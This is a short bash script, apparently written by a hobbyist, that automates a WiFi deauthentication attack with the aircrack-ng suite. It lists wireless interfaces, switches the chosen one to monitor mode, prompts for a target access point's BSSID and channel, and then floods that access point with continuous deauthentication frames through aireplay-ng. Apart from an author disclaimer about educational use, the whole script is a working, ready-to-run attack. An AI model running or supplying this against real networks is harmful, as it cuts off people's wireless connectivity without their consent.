#/bin/bash
green='\033[1;31m'
nc='\033[0m'
clear
echo "# WiFi Deauth Script"
echo "# Relies on the Aircrack-ng suite"
echo "# Script written by Matthew Sweet <themattbook@gmail.com>"
echo " "
echo "DISCLAIMER: This script is provided for educational"
echo "and automated purposes. I did not write any software"
echo "nor does this script contribute to the aircrack-ng suite."
echo "Please use responsibly, for I am not liable for any"
echo "damages from misuse."
echo " "
printf ${green}"Available devices:\n"${nc}
iwconfig | grep wlan
echo " "
printf ${green}"Specify the interface: "${nc}
read interface_variable
echo " "
echo "** Putting interface in monitor mode..."
ifconfig $interface_variable down
iwconfig $interface_variable mode monitor
sleep 3
ifconfig $interface_variable up
printf ${green}"** Interface now in monitor mode."${nc}
echo " "
echo " "
printf ${green}"Please enter the BSSID of the Access Point you wish to deauth: "${nc}
read bssid_variable
echo " "
printf ${green}"Channel: "${nc}
read channel_variable
echo " "
iwconfig $interface_variable channel $channel_variable
sleep 5
printf ${green}"Deauthing now. Press CTRL+C to quit."${nc}
echo " "
aireplay-ng -0 0 -a $bssid_variable $interface_variable
